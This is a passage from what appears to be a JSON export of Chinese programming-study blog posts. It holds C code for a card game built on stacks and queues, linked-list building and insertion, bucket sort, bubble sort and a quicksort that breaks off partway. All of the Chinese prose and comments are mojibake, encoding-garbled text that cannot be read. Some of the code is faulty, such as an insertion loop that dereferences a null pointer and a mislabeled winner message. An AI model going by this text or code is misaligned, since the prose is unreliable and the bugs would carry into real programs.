ç‰Œï¼Œè¿™é‡Œçº¦å®šç‰Œé¢å¤§å°ä¸º 1~9\nç”± A å…ˆå‡ºä¸€å¼ ï¼Œ B å†å‡ºä¸€å¼ ï¼Œè¿™æ ·çš„é¡ºåºè¿›è¡Œå‡ºç‰Œ\nå¦‚æœæŸäººæ‰“å‡ºçš„ç‰Œä¸æ¡Œä¸ŠæŸå¼ ç‰Œå¤§å°ä¸€æ ·ï¼Œé‚£ä¹ˆå³å¯è·å¾—ä¸¤å¼ ç‰ŒåŠå…¶ä¸­é—´æ‰“å‡ºçš„ç‰Œï¼Œå¹¶æ”¾åˆ°è‡ªå·±æ‰‹ç‰Œçš„æœ«å°¾\nå½“ä»»æ„ä¸€äººæ‰‹ç‰Œå‡ºå®Œæ—¶ï¼Œå¯¹æ‰‹è·èƒœ\nå…ˆç®€å•çš„æ€è€ƒä¸€ä¸‹å§\nè§£å†³è¿™ä¸ªé¢˜éœ€è¦ç”¨åˆ°ä¸Šé¢çš„çŸ¥è¯†ï¼Œå³é˜Ÿåˆ—å’Œæ ˆ\nç›´æ¥ä¸Šä»£ç ğŸ‘‡ï¼š\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;string.h\u0026gt;\tstruct queue\r{\rint data[1000];\rint head ;\rint tail;\r};\rstruct stack {\rint data[10];\rint top;\r};\rint main()\r{\rint t;\rint number[10];//ç”¨æ¡¶æ¥è®°å½•æ¡Œä¸Šçš„ç‰Œå’Œç‰Œæ•°\rmemset(number,0,sizeof(number));//å…ˆåˆå§‹åŒ–ä¸º0\rstruct queue a, b;//ä¸¤ä¸ªé˜Ÿåˆ—\rstruct stack s;//æ ˆ\ra.head = 0, a.tail = 0, b.tail = 0, b.head = 0;//åˆå§‹åŒ–é˜Ÿåˆ—\rs.top = 0;\rfor (int i = 0; i \u0026lt; 6; i++)\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;a.data[a.tail]);\ra.tail++;\r}//å½•å…¥açš„æ‰‹ç‰Œ\rfor (int i = 0; i \u0026lt; 6; i++)\r{\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;b.data[b.tail]);\rb.tail++;\r}//å½•å…¥bçš„æ‰‹ç‰Œ\rwhile (a.tail \u0026gt; a.head \u0026amp;\u0026amp; b.tail \u0026gt; b.head)\r{\rt = a.data[a.head];//å…ˆå–å‡ºaçš„æ‰‹ç‰Œ\rif (number[t] == 0)//åˆ¤æ–­æ¡Œä¸Šæ˜¯å¦æœ‰ç›¸åŒçš„ç‰Œï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰\r{\ra.head++;\ts.top++;\rs.data[s.top] = t;//å°†açš„ç‰Œå…¥æ ˆ\rnumber[t]=1;\r}\relse//å‡å¦‚aå‡ºç‰Œåï¼Œèƒ½å¤Ÿè¿›è¡Œåƒç‰Œ\r{\ra.head++;\ra.data[a.tail] = t;\ra.tail++;\rwhile (s.data[s.top] != t)\r{\ra.data[a.tail] = s.data[s.top];\rnumber[s.data[s.top]]=0;//å°†æ ˆé¡¶çš„æ•°æ ‡è®°ä¸º0ï¼Œå› ä¸ºè¦é€€æ ˆäº†\ra.tail++;\rs.top--;\r}//è¿™ä¸ªå¾ªç¯çš„ä½œç”¨æ˜¯ä¾æ¬¡é€€å‡ºç›¸åº”çš„ç‰Œï¼Œå¹¶è¡¥åˆ°æ‰‹ç‰Œæœ«ç«¯\ra.data[a.tail] = s.data[s.top];\rnumber[s.data[s.top]] = 0;\ra.tail++;\rs.top--;//ç”±äºä¸Šé¢è¿™ä¸ªwhileåˆ°æœ€åä¸€ä¸ªæ•°å­—å°±åœäº†ï¼Œè¿™é‡Œåœ¨å¦å¤–åŠ ä¸€æ®µä»£ç ï¼Œä½¿å¾—åƒç‰Œå®Œæ¯•\r}\rif (a.head == a.tail)//è¿™æ—¶açš„æ‰‹ç‰Œå·²ç»æ‰“å®Œäº†ï¼Œ\rbreak;\r//ä¸‹é¢åˆ°bå‡ºç‰Œäº†ï¼ŒåŸºæœ¬æ€è·¯å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œcvä¸€ä¸‹ï¼Œå°†aæ”¹æˆbå°±å¯ä»¥äº†\rt = b.data[b.head];\rif (number[t] == 0)\r{\rb.head++;\ts.top++;\rs.data[s.top] = t;\tnumber[t] = 1;\r}\relse//bèƒ½åƒç‰Œçš„æƒ…å†µ\r{\rb.head++;\rb.data[b.tail] = t;\rb.tail++;\rwhile (s.data[s.top] != t)\r{\rnumber[s.data[s.top]] = 0;\rb.data[b.tail] = s.data[s.top];\rb.tail++;\rs.top--;\r}\rnumber[s.data[s.top]] = 0;\rb.data[b.tail] = s.data[s.top];\rs.top--;\rb.tail++;\r}\r}//è‡³æ­¤å‡ºç‰Œé˜¶æ®µçš„ä»£ç å°±è¿™æ ·\r//ä¸‹é¢æ˜¯åˆ¤æ–­è¾“èµ¢çš„é˜¶æ®µäº†\rif (b.head == b.tail)//a win\r{\rprintf(\u0026#34;a win\\naçš„æ‰‹ç‰Œæ˜¯\\n\u0026#34;);\rfor (int i = a.head; i \u0026lt; a.tail; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, a.data[i]);\r}\rif (s.top != 0)//å¦‚æœæ¡Œä¸Šæœ‰ç‰Œï¼Œä¾¿è¾“å‡ºç‰Œæ¡Œä¸Šçš„ç‰Œ\r{\rprintf(\u0026#34;\\næ¡Œä¸Šçš„ç‰Œä¸ºï¼š\\n\u0026#34;);\rfor (int i = 1; i \u0026lt;= s.top; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, s.data[i]);\r}\r}\relse\r{\rprintf(\u0026#34;\\næ¡Œä¸Šæ²¡æœ‰ç‰Œäº†\\n\u0026#34;);\r}\r}\relse\r{\rprintf(\u0026#34;b win\\naçš„æ‰‹ç‰Œæ˜¯\\n\u0026#34;);\rfor (int i = b.head; i \u0026lt; b.tail; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, b.data[i]);\r}\rif (s.top != 0)//å¦‚æœæ¡Œä¸Šæœ‰ç‰Œï¼Œä¾¿è¾“å‡ºç‰Œæ¡Œä¸Šçš„ç‰Œ\r{\rprintf(\u0026#34;\\næ¡Œä¸Šçš„ç‰Œä¸ºï¼š\\n\u0026#34;);\rfor (int i = 1; i \u0026lt;= s.top; i++)\r{\rprintf(\u0026#34;%d \u0026#34;, s.data[i]);\r}\r}\relse\r{\rprintf(\u0026#34;\\næ¡Œä¸Šæ²¡æœ‰ç‰Œäº†\\n\u0026#34;);\r}\r}\rreturn 0;\r} åŸºæœ¬çš„æ€è·¯æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œä»£ç çš„é‡å¤ç‰‡æ®µä¹Ÿæ¯”è¾ƒå¤šï¼Œåªæ˜¯çœ‹èµ·æ¥é•¿\nè¿™é‡Œè¦å°æ³¨æ„çš„æ˜¯è¾“å‡ºçš„æ—¶å€™æ ˆçš„topæ˜¯å¦ä¸ºç©ºï¼Œå…ˆåŠ å†è¿›æ ˆå’Œå…ˆè¿›æ ˆå†åŠ ä¼šæœ‰ä¸€ç‚¹å°åŒºåˆ«ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•°ç»„ç©ºå€¼\nåœ¨æ•°ç»„é‡Œé¢ä¹Ÿè¦æ³¨æ„ç©ºå€¼çš„é—®é¢˜\né“¾è¡¨ #\rå…¶å®ä¸Šå­¦æœŸå·²ç»æ¥è§¦è¿‡é“¾è¡¨äº†\nä½†æ˜¯å¤§å¤šæ•°åšé¢˜ç¯å¢ƒå‡ ä¹æ²¡æœ‰ç”¨åˆ°ä½¿ç”¨é“¾è¡¨çš„æƒ…å†µ\nè¿™é‡Œè¿˜æ˜¯å°±ç€ä¹¦å†å¤ä¹ ä¸€é\næˆ‘å¯¹äºé“¾è¡¨çš„ç†è§£ï¼šç”±ç»“æ„ä½“é¦–å°¾ç›¸è¿å½¢æˆçš„é“¾çŠ¶åŠ¨æ€æ•°ç»„\nâ€œåŠ¨æ€â€ï¼šå½“æˆ‘ä»¬ç”³è¯·æ•°ç»„çš„æ—¶å€™ï¼Œä¸€æ—¦ç»™å‡ºæ•°ç»„çš„å…·ä½“å¤§å°ä¾¿ä¸èƒ½å†è¿›è¡Œæ›´æ”¹ï¼Œæ¯”å¦‚è¯´ int a[100]ï¼Œè¿™ä¸ªæ•´å‹æ•°ç»„åªèƒ½è£…100ä¸ªintï¼Œä¸èƒ½è¶Šç•Œã€‚å…¶å®é“¾è¡¨å¹¶ä¸æ˜¯ä»¥æ•°ç»„æ–¹å¼è¿›è¡Œå‚¨å­˜çš„ï¼Œåªæ˜¯æ–¹ä¾¿ç†è§£ï¼Œé“¾è¡¨å¯ä»¥é€šè¿‡mallocå‡½æ•°ç”³è¯·æ–°çš„ç©ºé—´å¹¶å°†ç©ºé—´ä¸é“¾æ¡å°¾éƒ¨è¿›è¡Œè¿æ¥ï¼Œè¿™æ ·æ¥å»¶é•¿é“¾çš„é•¿åº¦ï¼Œå³è¾¾åˆ°åŠ¨æ€æ•°ç»„çš„æ•ˆæœ\n**é“¾è¡¨çš„ä¼˜ç‚¹ï¼š**æœ‰å¤šå°‘å å¤šå°‘ï¼Œä¸æµªè´¹ç©ºé—´ï¼Œç›¸è¾ƒäºä½¿ç”¨æ•°ç»„å‚¨å­˜æœªçŸ¥é‡çš„æ•°æ®è¦å¼€å¾—å¾ˆå¤§çš„æƒ…å†µï¼Œé“¾è¡¨èƒ½èŠ‚çº¦å¾ˆå¤§ç©ºé—´\né“¾è¡¨çš„å…ƒç»“æ„ï¼ˆæˆ–è€…æœ€å°å•ä½ï¼‰ï¼šç”±ä¸€ä¸ªæ•°æ®é‡å’Œä¸€ä¸ªæŒ‡é’ˆç»„æˆï¼Œå½¢æˆä¸€ä¸ªç»“æ„ä½“ï¼Œä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªç»“æ„ä½“çš„æ•°æ®é‡ï¼Œä»¥æ­¤å½¢æˆé“¾æ¡\nå…·ä½“ç»“æ„å¯ä»¥å‚è€ƒä¸‹å›¾ğŸ‘‡\nå…ˆç®€å•çš„æ¥å†™ä¸€ä¸ªé“¾è¡¨çš„ä½¿ç”¨å§\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;stdlib.h\u0026gt;\rstruct pNode {\rint a;\rstruct pNode* next;\r};\rint main()\r{\rint n = 5;//è¾“å…¥5ä¸ªæ•°å­—\rstruct pNode *head=NULL,*p,*q,*t;\rp = head;\rq = head;\rfor (int i = 0; i \u0026lt; n; i++)\r{\rint num;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;num);\rp = (struct pNode*)malloc(sizeof(struct pNode));//ç”³è¯·ä¸€ä¸ªç»“æ„ä½“å¤§å°çš„ç©ºé—´\rp-\u0026gt;a = num;\rp-\u0026gt;next= NULL;\tif (head == NULL)//ç¬¬ä¸€æ¬¡åˆ›å»ºèŠ‚ç‚¹çš„æƒ…å†µä¸‹\r{\rhead = p;\r}\relse\r{\rq-\u0026gt;next=p;\r}\rq = p;\r}\rt = head;\rwhile (t != NULL)\r{\rprintf(\u0026#34;%d \u0026#34;, t-\u0026gt;a);\rt = t-\u0026gt;next;\r}\rreturn 0;\r} é‚£ä¹ˆæƒ³æƒ³å¦‚ä½•æ’å…¥æ•°æ®ã€åˆ é™¤æ•°æ®ï¼Ÿ\nå¾ˆæ˜æ˜¾\nå‡å¦‚æˆ‘ä»¬è¦æ’å…¥æ•°æ®ï¼Œåªéœ€è¦ç«¯å¼€æ’å…¥ä½ç½®çš„æŒ‡é’ˆï¼Œå¹¶ä¸”é‡æ–°ç”³è¯·ç©ºé—´ï¼Œæœ€åâ€œç¼åˆâ€èµ·æ¥\nå¦‚æœè¦åˆ é™¤æ•°æ®ï¼Œåˆ™æ›´ä¸ºç®€å•ï¼Œåªéœ€è¦å°†æŒ‡é’ˆç»•è¿‡ä¸éœ€è¦çš„æ•°æ®ï¼Œè®©ä¸Šä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆæŒ‡å‘åˆ é™¤ç»“æ„ä½“çš„ä¸‹ä¸€ä¸ªç»“æ„ä½“å°±è¡Œå•¦\né‚£ä¹ˆæ¥å†™ä¸€å†™æ’å…¥æ•°æ®çš„ä»£ç å§\n#include\u0026lt;stdio.h\u0026gt;\t#include\u0026lt;stdlib.h\u0026gt;\rstruct pNode {\rint a;\rstruct pNode* next;\r};\rint main()\r{\rint n = 5;//è¾“å…¥5ä¸ªæ•°å­—\rstruct pNode *head=NULL,*p,*q,*t;\rp = head;\rq = head;\rfor (int i = 0; i \u0026lt; n; i++)\r{\rint num;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;num);\rp = (struct pNode*)malloc(sizeof(struct pNode));//ç”³è¯·ä¸€ä¸ªç»“æ„ä½“å¤§å°çš„ç©ºé—´\rp-\u0026gt;a = num;\rp-\u0026gt;next= NULL;\tif (head == NULL)//ç¬¬ä¸€æ¬¡åˆ›å»ºèŠ‚ç‚¹çš„æƒ…å†µä¸‹\r{\rhead = p;\r}\relse\r{\rq-\u0026gt;next=p;\r}\rq = p;\r}\rt = head;\rint insert;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;insert);//è¾“å…¥å¾…æ’å…¥çš„æ•°å­—\rwhile (t != NULL)\r{\rint num = t-\u0026gt;a;\rif (t-\u0026gt;next-\u0026gt;a \u0026gt; insert||t-\u0026gt;next==NULL)\r{\rp= (struct pNode*)malloc(sizeof(struct pNode));\rp-\u0026gt;a = insert;\rp-\u0026gt;next = t-\u0026gt;next;\rt-\u0026gt;next = p;\rbreak;\r}\rt = t-\u0026gt;next;\r}\rt = head;\rwhile (t != NULL)\r{\rprintf(\u0026#34;%d \u0026#34;, t-\u0026gt;a);\rt = t-\u0026gt;next;\r}\rreturn 0;\r} å‡å¦‚è¾“å…¥ 1 10 20 60 100 ï¼Œinsertè¾“å…¥ä¸º 50\né‚£ä¹ˆè¾“å‡ºå°±ä¼šåœ¨ 20å’Œ60 ä¸­é—´æ’å…¥ä¸€ä¸ª50ï¼Œå®Œæˆæ’å…¥æ•°æ®æ“ä½œ\nåˆ é™¤æ•°æ®çš„è¯å°±è®²ä¸€ä¸‹æ€è·¯ç½¢ï¼Œä¸æƒ³å†™ä»£ç äº†ğŸ˜«\nç”¨ä¸¤ä¸ªç»“æ„ä½“æŒ‡é’ˆï¼Œä¸€å‰ä¸€åï¼ˆæˆ–è€…ä¸€å·¦ä¸€å³ï¼‰ï¼Œå‘å³ç§»åŠ¨ï¼ˆé»˜è®¤é“¾è¡¨å‘å³å»¶ç”³å˜›ï¼‰ï¼Œå½“å³æŒ‡é’ˆé‡åˆ°è¦åˆ é™¤çš„æ•°æ®ä¹‹åï¼Œå·¦æŒ‡é’ˆåœä½ä¸åŠ¨ï¼Œå³æŒ‡é’ˆè·³è·ƒåˆ°ä¸‹ä¸€ä¸ªç»“æ„ä½“ï¼Œç„¶åè®©å·¦æŒ‡é’ˆçš„ç»“æ„ä½“æŒ‡å‘å³æŒ‡é’ˆçš„ç»“æ„ä½“ï¼Œå®ç°åˆ é™¤æ“ä½œ\nè‡ªè¨€è‡ªè¯­ï¼šä»£ç å¯èƒ½å†™å¾—è¿˜æ˜¯æœ‰ç‚¹å†—ä½™ï¼Œå¾…æ”¹è¿›ï¼Œè¯­è¨€è¡¨è¿°å¯èƒ½è¿˜éœ€è¦åŠ å¼ºğŸ˜„\n","date":"2023-07-10","externalUrl":null,"permalink":"/posts/2023/07/stack-queue-linked-list/","section":"Posts","summary":"","title":"æ ˆã€é˜Ÿåˆ—ã€é“¾è¡¨","type":"posts"},{"content":"ä»è½¯å·¥æ¯•ä¸šå­¦é•¿é‚£é‡Œæ·˜æ¥ä¸€æœ¬ã€Šå•Šå“ˆï¼ç®—æ³•ã€‹\nç„¶åè·Ÿç€è¿™æœ¬ä¹¦å­¦ä¹ å­¦ä¹ ï¼Œè®°å½•ä¸€ä¸‹\næ¡¶æ’åº #\råœ¨ç”Ÿæ´»ä¸­ä¼šé‡åˆ°ä¸€äº›æ’åºé—®é¢˜ï¼Œæ¯”å¦‚ç«™é˜Ÿåˆ—çš„æ—¶å€™è¦æŒ‰èº«é«˜æ’åºã€è€ƒè¯•çš„åæ¬¡è¦æŒ‰åˆ†æ•°æ’åºã€ç½‘ä¸Šè´­ç‰©æœ‰æ—¶ä¼šæŒ‰ä»·æ ¼æ’åºâ€¦â€¦\nå¯¹äºä¸€ç»„å¾ˆç®€å•çš„æ•°å­—ï¼Œæ¡¶æ’åºæ— ç–‘æ˜¯æœ€å¿«æœ€ç®€å•çš„\nâ€œæ¡¶â€çš„ç†è§£ï¼šä¸€ä¸ªä¸€ç»´æ•°ç»„ï¼Œå¤§å°ä¸ºè¾“å…¥æ•°å­—çš„æœ€å¤§å€¼+1ï¼Œæ•°ç»„çš„æ¯ä¸€ä¸ªä¸‹æ ‡éƒ½æ˜¯ä¸€ä¸ªæ ‡ç­¾ï¼Œé»˜è®¤æ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ çš„å€¼éƒ½æ˜¯0ï¼Œå½“éå†åˆ°_å˜é‡å€¼ç­‰äºä¸‹æ ‡å€¼_çš„æ—¶å€™å‘¢ï¼Œè¿™ä¸ªæ•°ç»„å…ƒç´ çš„å€¼å°±è‡ªå¢ï¼Œæœ€åè¿™ä¸ªä¸€ç»´æ•°ç»„çš„å€¼å°±æœ‰0æˆ–é0ï¼Œåªéœ€è¦æŒ‰ä¸‹æ ‡å¤§å°å–å‡ºå…ƒç´ å€¼å°±èƒ½å®Œæˆæ’åºã€‚\nä¾‹å¦‚ï¼šè¾“å…¥5ä¸ªæ•°å­—ï¼Œå¹¶ä»å¤§åˆ°å°è¾“å‡º\nç”¨Cè¯­è¨€ä»£ç å®ç°å°±æ˜¯è¿™æ ·ğŸ‘‡ï¼ˆç¼–è¯‘å™¨ä¸ºVS 2022ï¼Œä¸€äº›å…³é”®å­—ä¼šæœ‰æ‰€ä¸åŒ\n#include\u0026lt;stdio.h\u0026gt;\rint main()\r{\rint a[21];\rfor (int i = 0; i \u0026lt; 21; i++)\ra[i] = 0;//åˆå§‹åŒ–æ•°ç»„ä¸º0\rfor (int i = 0; i \u0026lt; 5; i++)\r{\rint num;\rscanf_s(\u0026#34;%d\u0026#34;, \u0026amp;num);\ra[num]++;\r}\rfor (int i = 20; i \u0026gt;= 0; i--)\r{\rif (a[i] != 0)\r{\rfor (int j = 0; j \u0026lt; a[i]; j++)\r{\rprintf(\u0026#34;%d \u0026#34;, i);\r}\r}\r}\rreturn 0;\r} æ’åºæ˜¯å¯ä»¥å®ç°äº†ï¼Œé‚£ä¹ˆæƒ³æƒ³æœ‰ä»€ä¹ˆå¼Šç«¯ï¼Ÿ\næ¡¶æ’åºæ˜¯åŸºäºæ•°ç»„çš„ä¸‹æ ‡å®ç°çš„\né‚£ä¹ˆè‚¯å®šä¼šå­˜åœ¨è¿™äº›é—®é¢˜ï¼š\næ•°å­—ä¸èƒ½ä¸ºè´Ÿæ•°æˆ–è€…å°æ•°\næ•°å­—ä¸èƒ½å¤§äºæ•°ç»„çš„æœ€å¤§å€¼-1\næ•°ç»„ä¹Ÿä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶ä¼šååˆ†æµªè´¹ç©ºé—´\nä¸‹é¢æ˜¯ä¸€é“æœ‰å…³æ¡¶æ’åºçš„æ´›è°·é¢˜ï¼š\nç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²Â sÂ ï¼Œæ ¹æ®å­—ç¬¦å‡ºç°çš„Â é¢‘ç‡Â å¯¹å…¶è¿›è¡ŒÂ é™åºæ’åºÂ ã€‚ä¸€ä¸ªå­—ç¬¦å‡ºç°çš„Â é¢‘ç‡Â æ˜¯å®ƒå‡ºç°åœ¨å­—ç¬¦ä¸²ä¸­çš„æ¬¡æ•°ã€‚\nç¤ºä¾‹ï¼š\nè¾“å…¥: s = \u0026ldquo;tree\u0026rdquo;\nè¾“å‡º: \u0026ldquo;eert\u0026rdquo;\nè§£é‡Š: \u0026rsquo;e\u0026rsquo;å‡ºç°ä¸¤æ¬¡ï¼Œ\u0026lsquo;r\u0026rsquo;å’Œ\u0026rsquo;t\u0026rsquo;éƒ½åªå‡ºç°ä¸€æ¬¡ã€‚\nå› æ­¤\u0026rsquo;e\u0026rsquo;å¿…é¡»å‡ºç°åœ¨\u0026rsquo;r\u0026rsquo;å’Œ\u0026rsquo;t\u0026rsquo;ä¹‹å‰ã€‚æ­¤å¤–ï¼Œ\u0026ldquo;eetr\u0026quot;ä¹Ÿæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ç­”æ¡ˆã€‚\næç¤ºï¼š\n1 \u0026lt;= s.length \u0026lt;= 5 * 105\nsÂ ç”±å¤§å°å†™è‹±æ–‡å­—æ¯å’Œæ•°å­—ç»„æˆ\nå®ç°ä»£ç å¦‚ä¸‹ï¼š\n#include\u0026lt;stdio.h\u0026gt;\r#include\u0026lt;string.h\u0026gt;\r#include\u0026lt;stdlib.h\u0026gt;\rchar s[500001];\rint a[130];\rint cmp(char* p1, char* p2)\r{\rint n = a[*p1];\rint m = a[*p2];\rif (n == m)\r{\rreturn *p1 - *p2;//ä¸‹æ ‡ä¸€æ ·åˆ™æŒ‰ç…§å­—æ¯é¡ºåºæ’åˆ—\r}\rreturn m-n;//ä¸‹æ ‡ä¸ä¸€æ ·åˆ™æŒ‰ç…§é¢‘ç‡æ’åˆ—\r}\rint main()\r{\rmemset(a, 0, sizeof(a));\rscanf_s(\u0026#34;%s\u0026#34;, s,500001);\rint len = strlen(s);\rfor (int i = 0; i \u0026lt; len; i++)\r{\ra[s[i]]++;\r}\rqsort(s, len, sizeof(char), cmp);\rprintf(\u0026#34;%s\u0026#34;, s);\r} è¿™é‡Œæ¶‰åŠåˆ°äº†qsortå¿«é€Ÿæ’åºå‡½æ•°ï¼Œä¸è¿‡ä¸»ä½“è¿˜æ˜¯æ¡¶æ’åº\nå†’æ³¡æ’åº #\rå†’æ³¡çš„åŸºæœ¬æ€æƒ³æ˜¯ï¼šæ¯æ¬¡æ¯”è¾ƒä¸¤ä¸ªç›¸é‚»çš„å…ƒç´ ï¼Œç„¶åæ ¹æ®å¤§å°äº¤æ¢\nä¸‹é¢æ˜¯åŠ¨æ€å›¾æ¼”ç¤ºï¼š\nè¿™ç§æ’åºçš„æ ¸å¿ƒå°±æ˜¯åŒé‡forå¾ªç¯è¿›è¡Œéå†æ¯”è¾ƒ\nç½‘ä¸Šéšä¾¿æ‰¾ä¸€æ®µä»£ç ï¼š\n#include\u0026lt;stdio.h\u0026gt;\tint main()\r{\rint n[10] = { 25,35,68,79,21,13,98,7,16,62 };//å®šä¹‰ä¸€ä¸ªå¤§å°ä¸º10çš„æ•°ç»„\rint i, j, temp;\rfor (i = 1; i \u0026lt;= 9; i++)//å¤–å±‚å¾ªç¯æ˜¯æ¯”è¾ƒçš„è½®æ•°ï¼Œæ•°ç»„å†…æœ‰10ä¸ªæ•°ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ¯”è¾ƒ10-1=9è½®\r{\rfor (j = 0; j \u0026lt;= 9 - i; j++)//å†…å±‚å¾ªç¯æ¯”è¾ƒçš„æ˜¯å½“å‰ä¸€è½®çš„æ¯”è¾ƒæ¬¡æ•°ï¼Œä¾‹å¦‚ï¼šç¬¬ä¸€è½®æ¯”è¾ƒ9-1=8æ¬¡ï¼Œç¬¬äºŒè½®æ¯”è¾ƒ9-2=7æ¬¡\r{\rif (n[j] \u0026gt; n[j + 1])//ç›¸é‚»ä¸¤ä¸ªæ•°å¦‚æœé€†åºï¼Œåˆ™äº¤æ¢ä½ç½®\r{\rtemp = n[j];\rn[j] = n[j + 1];\rn[j + 1] = temp;\r}\r}\r}\rfor (i = 0; i \u0026lt; 10; i++)\rprintf(\u0026#34;%d \u0026#34;, n[i]);\r} è¿™æ˜¯æœ€åŸºæœ¬çš„å†’æ³¡æ–¹æ³•\nå¯ä»¥åœ¨ç¬¬ä¸€å±‚forå¾ªç¯é‡Œè®¾ç«‹åˆ¤æ–­ï¼Œå¦‚æœç¬¬äºŒå±‚foré‡Œæ²¡æœ‰è¿›è¡Œäº¤æ¢åˆ™è¯´æ˜å·²ç»å®Œæˆæ’åºï¼Œå°±é€€å‡ºå¾ªç¯\nä¸è¿‡å½“æ•°ç»„æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼Œä½¿ç”¨å†’æ³¡æ’åºå¹¶ä¸æ˜¯ä¸€ä¸ªå¥½çš„é€‰æ‹©\nå¿«é€Ÿæ’åº #\rè¿™æ˜¯ä¸€ç§æœ€å¸¸è§çš„æ’åºæ–¹å¼\nåŸºæœ¬æ€æƒ³ï¼šä½¿ç”¨â€œåˆ†æ²»â€çš„ç­–ç•¥ï¼Œå°†åºåˆ—åˆ†ä¸ºä¸¤ä¸ªå­åºåˆ—ï¼Œå¹¶è®¾ç«‹ä¸€ä¸ªåŸºå‡†æ•°ï¼ˆé€šå¸¸ä¸ºç¬¬ä¸€ä¸ªæ•°å­—ï¼‰ï¼Œæ¯”è¾ƒåŸºå‡†æ•°ä¸¤ä¾§çš„æ•°æ®å¤§å°æ¥æ’åºï¼ˆä¸¤ä¾§å¹¶ä¸æ˜¯çœŸçš„è¿™ä¸ªæ•°å­—çš„ä¸¤ä¾§ï¼Œè€Œæ˜¯åºåˆ—çš„ä¸¤ä¾§ï¼‰\næ¯”å¦‚è¯´ä¸‹é¢è¿™ç§æ’åˆ—ï¼š\n3 1 2 5 4 6 9 7 10 8\nè¿™æ—¶ä»¥æ•°å­—6ä¸ºåŸºå‡†æ•°ï¼Œå·¦è¾¹éƒ½æ˜¯å°äº6ï¼Œå³è¾¹åˆ™éƒ½æ˜¯å¤§äº6ï¼Œè¿™æ˜¯å¿«é€Ÿæ’åºæƒ³è¦è¾¾åˆ°çš„æ•ˆæœ\nå¦‚ä½•å®ç°ï¼Ÿ\nå‡å¦‚åˆå§‹åºåˆ—ä¸ºè¿™æ ·ï¼š\n6 1 2 7 9 3 4 5 10 8\nåˆ†åˆ«ä»åºåˆ—çš„ä¸¤ç«¯å¼€å§‹æ¢æµ‹ï¼Œå¯ä»¥ç†è§£ä¸ºä¸¤ä¸ªæŒ‡é’ˆå‘ä¸­é—´ç§»åŠ¨ï¼ˆï¼‰\nä»¥6ä¸ºåŸºå‡†æ•°ï¼Œå…ˆä»å³å¾€å·¦æ‰¾ä¸€ä¸ªå°äº6çš„æ•°å­—ï¼Œå†ä»å·¦å¾€å³æ‰¾ä¸€ä¸ªå¤§äº6çš„æ•°å­—ï¼Œå¹¶å°†å…¶äº¤æ¢ï¼ˆä¸æ˜¯åŒæ—¶è¿›è¡Œçš„\näºæ˜¯ç¬¬ä¸€éä¹‹åå°±æ‰¾åˆ° 7 å’Œ 5 ä¸¤ä¸ªæ•°å­—å¹¶äº¤æ¢\nå½¢æˆæ–°çš„åºåˆ—ï¼š\n6 1 2 5 9 3 4 7 10 8\nç„¶åé‡å¤è¿™æ ·çš„æ“ä½œ\nè¿™é‡Œå°±çœç•¥ä¸€éƒ¨åˆ†\næœ€ç»ˆä¼šé‡åˆ°è¿™æ ·çš„æ•°åˆ—ï¼š\n6 1 2 5 4 3 9 7 10 8\nå¯ä»¥çœ‹åˆ°\nä»å·¦å¾€å³æ‰¾å¤§äºçš„æ—¶å€™å·¦æŒ‡é’ˆä¼šæŒ‡å‘7\nä»å³å¾€å·¦æ‰¾å°äºçš„æ—¶å€™å³æŒ‡é’ˆä¼šæŒ‡å‘3\nè€Œè¿™ç§æ’åºè¦æ±‚çš„æ˜¯å³æŒ‡é’ˆè¦å…ˆäºå·¦æŒ‡é’ˆç§»åŠ¨\näºæ˜¯å³æŒ‡é’ˆåœç•™åœ¨ 3 ï¼Œå·¦æŒ‡é’ˆåœ¨ç§»åŠ¨çš„æ—¶å€™ä¼šåœ¨3ä¸å³æŒ‡é’ˆç›¸é‡ï¼\nçœ‹çœ‹ 3 å’ŒåŸºå‡†æ•° 6 çš„ä½ç½®å…³ç³»å‘¢ï¼Ÿ\nå°† 3 å’Œ 6 äº¤æ¢ä¸€ä¸‹ä¾¿èƒ½å‘ç°æ­¤æ—¶åºåˆ—ä¸ºï¼š\n3 1 2 5 4 6 9 7 10 8\n6çš„å·¦è¾¹å…¨æ˜¯å°äºï¼Œè€Œå³è¾¹å…¨æ˜¯å¤§äº\nè‡³æ­¤ç¬¬ä¸€è½®æ¢æµ‹ä¾¿çœŸæ­£ç»“æŸï¼Œ6å›åˆ°äº†æ­£ç¡®çš„ä½ç½®\nä¸è¿‡ 6 ä¸¤ä¾§çš„åºåˆ—è¿˜æ˜¯æ— åºçš„ï¼Œéœ€è¦è¿›è¡Œæ’åº\nåŸºäºè¿™ç§æ€æƒ³ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹Cä»£ç å®ç°å¿«é€Ÿæ’åº\n#include\u0026lt;stdio.h\u0026gt;\tint a[101];\rvoid quickSort(int left, int right)\r{\rint i, j, k, temp;\rif (left \u0026gt; right)\rreturn;\rtemp = a[left];//è®¾ç«‹åŸºå‡†æ•°ï¼Œä»¥å·¦è¾¹çš„ä¸ºåŸºå‡†æ•°\ri = left;\rj = right;//å¯ä»¥çœ‹ä½œä¸¤ä¸ªæŒ‡é’ˆ,è¿™é‡Œç”¨ä¸‹æ ‡æ¥æ›¿ä»£æŒ‡é’ˆ\rwhile (i != j)\r{\rwhile (a[j] \u0026gt;= temp \u0026amp;\u0026amp; i \u0026lt; 